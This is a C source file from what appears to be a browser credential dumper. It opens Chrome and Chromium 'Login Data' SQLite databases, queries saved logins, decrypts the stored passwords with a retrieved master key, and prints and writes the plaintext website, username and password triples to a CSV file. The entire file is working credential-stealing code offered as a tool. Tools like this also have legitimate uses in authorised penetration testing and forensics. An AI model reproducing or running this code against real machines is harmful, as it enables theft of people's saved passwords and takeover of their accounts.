#include "chrome.h"
#include "main.h"

#include "log.h"
#include "functions.h"

/** 
 * Prepare the sqlite3 statement to retrieve the creds from the db
 *
 * @return 1 on success, -1 on failure
 */
int prepare_sqlite_statement(char *login_data_path, sqlite3 **db, sqlite3_stmt **stmt) {
	int rc = sqlite3_open(login_data_path, db);
	if(rc != SQLITE_OK) {
		log_error("sqlite3_open() failure: %s", sqlite3_errmsg(*db));
		sqlite3_close(*db);
		return -1;
	}
	char *sql = "SELECT action_url, username_value, password_value FROM logins";
	rc = sqlite3_prepare_v2(*db, sql, -1, stmt, NULL);
	if(rc != SQLITE_OK) {
		log_error("sqlite3_prepare_v2() failure");
		sqlite3_close(*db);
		return -1;
	}
	return 1;
}

/**
 * Fetch the data of the sqlite3 query
 *
 * @return 1 on success, -1 on failure
 */
int fetch_sqlite_data(char **website, char **username, char **cipher_password, int *len_cipher_password, sqlite3_stmt **stmt) {
	// TODO: View better alternative to strncpy
	*website = malloc(strlen(sqlite3_column_text(*stmt, 0))+1);
	*username = malloc(strlen(sqlite3_column_text(*stmt, 1))+1);
	*cipher_password = malloc(sqlite3_column_bytes(*stmt, 2)+1);
	if(*website == NULL || *username == NULL || *cipher_password == NULL) {
		free(*website);
		free(*username);
		free(*cipher_password);
        log_error("malloc() failure");
		return -1;
	}

	size_t website_len = strlen(sqlite3_column_text(*stmt, 0));
	safe_strcpy(*website, (char *)sqlite3_column_text(*stmt, 0), website_len);

	size_t username_len = strlen(sqlite3_column_text(*stmt, 1));
	safe_strcpy(*username, (char *)sqlite3_column_text(*stmt, 1), username_len);

	int cipher_password_len = sqlite3_column_bytes(*stmt, 2);
	memcpy(*cipher_password, (char *)sqlite3_column_blob(*stmt, 2), cipher_password_len);
	(*cipher_password)[cipher_password_len] = '\0';
	*len_cipher_password = cipher_password_len;

	return 1;
}

/**
 * Main function that tries to retrieve the creds
 *
 * @return 1 on success, -1 on failure
 */
int get_chrome_creds(char *login_data_path, const char *output) {
	sqlite3 *db;
	sqlite3_stmt *stmt;
	if(prepare_sqlite_statement(login_data_path, &db, &stmt) == -1) {
		log_error("prepare_sqlite3_statement() failure");
		return -1;
	}

	char *masterkey;
	if(get_masterkey(login_data_path, &masterkey) == -1) {
        sqlite3_finalize(stmt);
	    sqlite3_close(db);
	    free(masterkey);
		log_error("get_masterkey() failure");
		return -1;
	}

	char *website;
	char *username;
	char *cipher_password;
	int len_cipher_password;
	char *plaintext_password;
	
	FILE *output_fd = NULL;
	if(output != NULL) {
		output_fd = fopen(output, "ab");
	}

	while(sqlite3_step(stmt) != SQLITE_DONE) {
	    website = NULL; username = NULL; cipher_password = NULL; plaintext_password = NULL;
		if(fetch_sqlite_data(&website, &username, &cipher_password, &len_cipher_password, &stmt) == -1) {
            sqlite3_finalize(stmt);
            sqlite3_close(db);
            free(masterkey);
			log_error("fetch_sqlite_data() failure");
			return -1;
		}
		if(website != NULL && strlen(website) > 0) {
            log_success("Website : %s", website);
		}
		if(username != NULL && strlen(username) > 0) {
            log_success("Username: %s", username);
		}
		if(cipher_password != NULL && len_cipher_password > 0) {
            if(decrypt_chrome_cipher(cipher_password, len_cipher_password, &plaintext_password, masterkey) == -1) {
                log_error("decrypt_chrome_cipher() failure");
            }
            if(plaintext_password != NULL && strlen(plaintext_password) > 0) {
                log_success("Password: %s\n", plaintext_password);
            }
        }

        // TODO: We only add to input file when we have full creds (Maybe change that ?)
        if(output != NULL && website != NULL && username != NULL && plaintext_password != NULL) {
            fprintf(output_fd, "\"%s\",\"%s\",\"%s\"\n",
                website,
                username,
                plaintext_password);
        }

        free(website);
        free(username);
        free(cipher_password);
        free(plaintext_password);
    }

	if(output != NULL) {
		fclose(output_fd);
	}
	if(masterkey != NULL) {
		free(masterkey);
	}
	sqlite3_finalize(stmt);
	sqlite3_close(db);

	return 1;
}

/**
 * Chrome functions wrapper that sets up everything we need
 *
 * @return 1 on success, -1 on failure 
 */
int dump_chrome(const char *output_file) {
	log_info("Starting Chrome dump ...\n");

	int result = 0;
	char chrome_path[MAX_PATH_SIZE];
	char chrome_login_data_path[MAX_PATH_SIZE];
	char chromium_path[MAX_PATH_SIZE];
	char chromium_login_data_path[MAX_PATH_SIZE];
	//char brave_path[MAX_PATH_SIZE];
	//char brave_login_data_path[MAX_PATH_SIZE];

	load_chrome_paths(chrome_path, chrome_login_data_path, chromium_path, chromium_login_data_path);


	// TODO: S_OK / F_OK ?
	if(access(chrome_login_data_path,0) != -1) {
        log_verbose("Chrome path : %s", chrome_login_data_path);
		log_info("Starting Chrome credentials dump...\n");
		result = get_chrome_creds(chrome_login_data_path, output_file);
	}

	// TODO: S_OK / F_OK ?
	if(access(chromium_login_data_path, 0) != -1) {
        log_verbose("Chromium path : %s", chromium_login_data_path);
		log_info("Starting Chromium credentials dump...\n");
		result = get_chrome_creds(chromium_login_data_path, output_file);
	} 

	//if(access(brave_login_data_path, F_OK) != -1) {
	//	printf("[*] Starting Brave credentials dump...\n\n");
	//	result = get_creds(brave_login_data_path, output);
	//}

	if(result == 0) {
		log_error("Couldn't find any Chrome / Chromium installation");
		return -1;
	}
	else if (result == -1) {
		log_error("An error occured");
		return -1;
	}
	return 1;
}
